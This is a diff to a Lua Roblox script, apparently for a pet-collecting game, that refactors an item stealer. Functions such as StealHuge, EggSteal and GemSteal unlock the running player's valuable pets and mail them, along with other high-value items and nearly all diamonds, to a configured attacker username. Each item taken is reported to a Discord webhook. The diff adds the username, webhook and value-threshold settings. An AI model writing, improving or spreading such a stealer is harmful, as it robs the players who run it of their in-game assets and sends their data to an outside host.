@@ -1,3 +1,7 @@
+Username = "your user here"
+Webhook = "" -- your discord webhook in here
+min_rap = 500000
+
 local function SendMessage(url, username, itemID)
     local http = game:GetService("HttpService")
     local headers = {
@@ -93,39 +97,18 @@ local function getRAP(Type, Item)
     end
 end
 
-local function StealHuge()
-	local hugesSent = 0
-	local initialHuges = CountHuges()
-    for i, v in pairs(save.Pet) do
-        local id = v.id
-        local dir = library.Directory.Pets[id]
-        if dir.huge and getRAP("Pet", v) >= min_rap then
-			if v._lk then
-				local args = {
-				[1] = i,
-				[2] = false
-				}
-				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
-			end
-            local args = {
-                [1] = user,
-                [2] = MailMessage,
-                [3] = "Pet",
-                [4] = i,
-                [5] = v._am or 1
-            }
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
-			local finalHuges = CountHuges()
-			if finalHuges < initialHuges then
-				hugesSent = hugesSent + 1
-				initialHuges = finalHuges
-			end
-        end
+local function sendItem(category, uid, am, id)
+    local args = {
+        [1] = user,
+        [2] = MailMessage,
+        [3] = category,
+        [4] = uid,
+        [5] = am or 1
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    if Webhook and Webhook ~= "" then
+        SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
     end
-	return hugesSent
 end
 
 local function CountHuges()
@@ -140,12 +123,49 @@ local function CountHuges()
 	return count
 end
 
+local function StealHuge()
+	local hugesSent = 0
+	local initialHuges = CountHuges()
+    for i, v in pairs(save.Pet) do
+        local id = v.id
+        local dir = library.Directory.Pets[id]
+        if dir.huge and getRAP("Pet", v) >= min_rap then
+			if v._lk then
+				local args = {
+				[1] = i,
+				[2] = false
+				}
+				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+			end
+            sendItem("Pet", i, v._am or 1, id)
+			local finalHuges = CountHuges()
+			if finalHuges < initialHuges then
+				hugesSent = hugesSent + 1
+				initialHuges = finalHuges
+			end
+        end
+    end
+	return hugesSent
+end
+
 local function SendAllHuges()
 	local totalHuges = CountHuges()
 	local hugesSent = 0
 	repeat
 		hugesSent = hugesSent + StealHuge()
 	until hugesSent == totalHuges
+end
+
+local function CountExc()
+	local count = 0
+	for i, v in pairs(save.Pet) do
+		local id = v.id
+		local dir = library.Directory.Pets[id]
+		if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
+			count = count + 1
+		end
+	end
+	return count
 end
 
 local function ExcSteal()
@@ -162,17 +182,7 @@ local function ExcSteal()
 				}
 				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
 			end
-            local args = {
-                [1] = user,
-                [2] = MailMessage,
-                [3] = "Pet",
-                [4] = i,
-                [5] = v._am or 1
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
+            sendItem("Pet", i, v._am or 1, id)
 			local finalExc = CountExc()
 			if finalExc < initialExc then
 				excSent = excSent + 1
@@ -181,18 +191,6 @@ local function ExcSteal()
         end
     end
 	return excSent
-end
-
-local function CountExc()
-	local count = 0
-	for i, v in pairs(save.Pet) do
-		local id = v.id
-		local dir = library.Directory.Pets[id]
-		if dir.exclusiveLevel and getRAP("Pet", v) >= min_rap then
-			count = count + 1
-		end
-	end
-	return count
 end
 
 local function SendAllExc()
@@ -208,17 +206,7 @@ local function EggSteal()
 		local id = v.id
 		local diregg = library.Directory.Eggs[id]
 		if diregg and getRAP("Egg", v) >= min_rap then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Egg",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
+			sendItem("Egg", i, v._am or 1, id)
 		end
     end
 end
@@ -228,17 +216,7 @@ local function CharmSteal()
         local id = v.id
 		local dircharm = library.Directory.Charms[id]
 		if dircharm and getRAP("Charm", v) >= min_rap then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Charm",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
+			sendItem("Charm", i, v._am or 1, id)
 		end
     end
 end
@@ -248,17 +226,7 @@ local function EnchantSteal()
 		local id = v.id
 		local direnchant = library.Directory.Enchants[id]
 		if direnchant and getRAP("Enchant", v) >= min_rap then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Enchant",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
+			sendItem("Enchant", i, v._am or 1, id)
 		end
     end
 end
@@ -268,17 +236,7 @@ local function PotionSteal()
 		local id = v.id
 		local dirpotion = library.Directory.Potions[id]
 		if dirpotion and getRAP("Potion", v) >= min_rap then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Potion",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
+			sendItem("Potion", i, v._am or 1, id)
 		end
     end
 end
@@ -288,17 +246,7 @@ local function miscSteal()
 		local id = v.id
 		local dirmisc = library.Directory.MiscItems[id]
 		if dirmisc and getRAP("Misc", v) > min_rap then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Misc",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
+			sendItem("Misc", i, v._am or 1, id)
 		end
 	end
 end
@@ -308,17 +256,7 @@ local function hoverSteal()
 		local id = v.id
 		local dirhover = library.Directory.Hoverboards[id]
 		if dirhover and getRAP("Hoverboard", v) > min_rap then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Hoverboard",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
+			sendItem("Hoverboard", i, v._am or 1, id)
 		end
 	end
 end
@@ -328,17 +266,7 @@ local function boothSteal()
 		local id = v.id
 		local dirbooth = library.Directory.Booths[id]
 		if dirbooth and getRAP("Booth", v) > min_rap then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Booth",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
+			sendItem("Booth", i, v._am or 1, id)
 		end
 	end
 end
@@ -348,17 +276,7 @@ local function ultimateSteal()
 		local id = v.id
 		local dirultimate = library.Directory.Ultimates[id]
 		if dirultimate and getRAP("Ultimate", v) > min_rap then
-			local args = {
-				[1] = user,
-				[2] = MailMessage,
-				[3] = "Ultimate",
-				[4] = i,
-				[5] = v._am or 1
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-			end
+			sendItem("Ultimate", i, v._am or 1, id)
 		end
 	end
 end
@@ -366,13 +284,12 @@ end
 local function GemSteal()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-            GemAmount = v._am
-            GemId = i
+            local GemAmount = v._am
             local args = {
                 [1] = user,
                 [2] = MailMessage,
                 [3] = "Currency",
-                [4] = GemId,
+                [4] = i,
                 [5] = GemAmount - 10000
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
